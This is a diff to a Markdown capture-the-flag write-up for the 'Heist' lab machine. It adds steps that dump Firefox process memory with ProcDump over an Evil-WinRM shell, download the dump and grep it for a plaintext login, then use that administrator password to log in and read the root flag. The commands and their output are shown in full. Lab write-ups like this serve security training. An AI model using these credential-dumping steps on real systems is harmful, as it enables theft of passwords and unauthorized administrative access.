@@ -453,9 +453,9 @@ Done:
 
 <br />
 
-This made me consider to enumerate the running `system processes`.
+This made me consider enumerating the running `system processes`.
 
-The most notable one is `firefox`, which may contain sensitive `data` such as credentials or session tokens.
+The most notable one is `Firefox`, which may contain sensitive data such as credentials or session tokens.
 
 <br />
 
@@ -470,17 +470,93 @@ The most notable one is `firefox`, which may contain sensitive `data` such as cr
 
 <br />
 
-## Extract Credentials from Firefox
+## Extracting Credentials from Firefox
 
 ## ProcDump.exe
 
 <br />
 
-With this scenario, we can try something like [ProcDump.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump).
+Given this context, we can use a tool like [ProcDump.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) to capture memory from active processes.
 
-`ProcDump.exe` is a famous tool used to `dump` interesting data from active `processes`.
+After uploading the tool, we can run it by targeting one of the `Firefox` process `PIDs`:
 
+<br />
 
+```bash
+*Evil-WinRM* PS C:\Users\Chase\Desktop> .\procdump64.exe -ma 6392 -accepteula
 
+ProcDump v11.0 - Sysinternals process dump utility
+Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
 
+[22:34:17] Dump 1 initiated: C:\Users\Chase\Desktop\firefox.exe_250704_223417.dmp
+[22:34:18] Dump 1 writing: Estimated dump file size is 518 MB.
+[22:34:20] Dump 1 complete: 519 MB written in 2.8 seconds
+[22:34:20] Dump count reached.
+```
 
+<br />
+
+Now we download the `dump` file:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Chase\Desktop> download firefox.exe_250704_223417.dmp
+                                        
+Info: Downloading C:\Users\Chase\Desktop\firefox.exe_250704_223417.dmp to firefox.exe_250704_223417.dmp
+
+Info: Download successful!
+```
+
+<br />
+
+By using keywords like `username`, we can search within the dumped data and extract credentials:
+
+<br />
+
+```bash
+strings firefox.exe_250704_223417.dmp | grep -i username
+
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+```
+
+<br />
+
+This `password` allows us to log into the system as `administrator`:
+
+<br />
+
+```bash
+❯ evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+w*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+supportdesk\administrator
+```
+<br /> 
+
+Finally, we can retrieve the `root.txt` flag:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+61ad4b65d87b4c1defbab70e30xxxxxx
+```
+
+<br />
+
+Machine Heist pwned!
+
+Hope you learned something and enjoyed the process!
+
+Keep hacking!❤️❤️
+
+<br />
